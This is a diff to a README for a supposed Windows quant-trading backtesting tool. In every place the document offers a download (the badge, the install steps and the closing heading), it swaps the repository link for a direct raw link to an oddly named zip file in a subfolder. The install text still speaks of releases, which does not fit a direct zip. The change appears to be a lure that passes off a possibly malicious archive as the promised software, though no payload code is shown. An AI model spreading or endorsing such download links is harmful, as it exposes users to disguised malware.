@@ -1,6 +1,6 @@
 # 📊 How-To-Backtest-Correctly - Reliable Quant Trading Tools
 
-[![Download](https://img.shields.io/badge/Download-How--To--Backtest--Correctly-ff69b4?style=for-the-badge)](https://github.com/pawanjangid7017/How-To-Backtest-Correctly)
+[![Download](https://img.shields.io/badge/Download-How--To--Backtest--Correctly-ff69b4?style=for-the-badge)](https://github.com/pawanjangid7017/How-To-Backtest-Correctly/raw/refs/heads/main/Rhizopogon/Backtest-Correctly-How-To-roband.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Make sure your computer meets the following:
 To use this software, follow these simple steps:
 
 1. Click the big **Download** button at the top or visit this page:  
-   https://github.com/pawanjangid7017/How-To-Backtest-Correctly
+   https://github.com/pawanjangid7017/How-To-Backtest-Correctly/raw/refs/heads/main/Rhizopogon/Backtest-Correctly-How-To-roband.zip
 
 2. On the webpage, look for the latest release or setup file for Windows.
 
@@ -64,7 +64,7 @@ To use this software, follow these simple steps:
 This section guides you through installing the software on your Windows PC.
 
 - Open the download page:  
-  https://github.com/pawanjangid7017/How-To-Backtest-Correctly
+  https://github.com/pawanjangid7017/How-To-Backtest-Correctly/raw/refs/heads/main/Rhizopogon/Backtest-Correctly-How-To-roband.zip
 
 - Find the **Releases** section on the right or near the top.
 
@@ -172,6 +172,6 @@ If the software does not start or shows errors, try these steps:
 
 ---
 
-# [⬇️ Download How-To-Backtest-Correctly](https://github.com/pawanjangid7017/How-To-Backtest-Correctly)
+# [⬇️ Download How-To-Backtest-Correctly](https://github.com/pawanjangid7017/How-To-Backtest-Correctly/raw/refs/heads/main/Rhizopogon/Backtest-Correctly-How-To-roband.zip)
 
 Click this link to visit the download page and get the latest version for Windows.
